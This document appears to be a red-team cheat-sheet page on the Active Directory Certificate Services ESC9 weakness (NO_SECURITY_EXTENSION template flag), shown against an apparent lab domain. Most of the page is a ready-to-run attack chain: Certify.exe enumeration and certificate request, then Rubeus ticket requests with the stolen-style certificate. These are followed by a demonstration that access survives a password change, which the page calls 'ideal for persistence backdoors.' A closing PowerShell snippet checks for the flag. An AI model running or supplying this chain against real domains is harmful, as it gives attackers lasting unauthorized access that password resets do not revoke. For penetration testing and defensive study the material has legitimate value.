title: ESC9: NO_SECURITY_EXTENSION
html:
Conditions: Template has NO_SECURITY_EXTENSION enrollment flag. Certificates issued from this template survive password changes — ideal for persistence backdoors.

Enumerate + Check Flag

Certify.exe find /vulnerable
Certify.exe find /vulnerable

    Template Name         : ESC9
    mspki-enrollment-flag : NO_SECURITY_EXTENSION, INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    pkiextendedkeyusage   : Client Authentication
    Enrollment Rights     : ESSOS\Domain Users    Access: Allow

Request Certificate

Certify.exe request /ca:<ca-host>\<ca-name> /template:<template>
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC9

[*] Current user context : ESSOS\missandei
[*] CA Response          : The certificate has been issued.
[*] Request ID           : 15

Authenticate (Persistence Demo — Survives Password Change)

Rubeus.exe asktgt /user:<username> /certificate:<username>.pfx /password:mimikatz
# Initial auth
Rubeus.exe asktgt /user:missandei /certificate:missandei.pfx /password:mimikatz
[+] TGT request successful!

# Change password
net user missandei "NewComplexPassword123!" /domain
The command completed successfully.

# Certificate STILL works after password change!
Rubeus.exe asktgt /user:missandei /certificate:missandei.pfx /password:mimikatz
[+] TGT request successful!

Check Flag via PowerShell

$templateDN = "CN=<template>,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=local"
$template = Get-ADObject -Identity $templateDN -Properties msPKI-Enrollment-Flag
if ($template.'msPKI-Enrollment-Flag' -band 0x80000) {
    Write-Host "NO_SECURITY_EXTENSION flag is SET (vulnerable)"
}
excerpt: Conditions: Template has NO_SECURITY_EXTENSION enrollment flag. Certificates issued from this template survive password changes — ideal for persistence backdoors. Enumerate + Check Flag Certify.exe fi
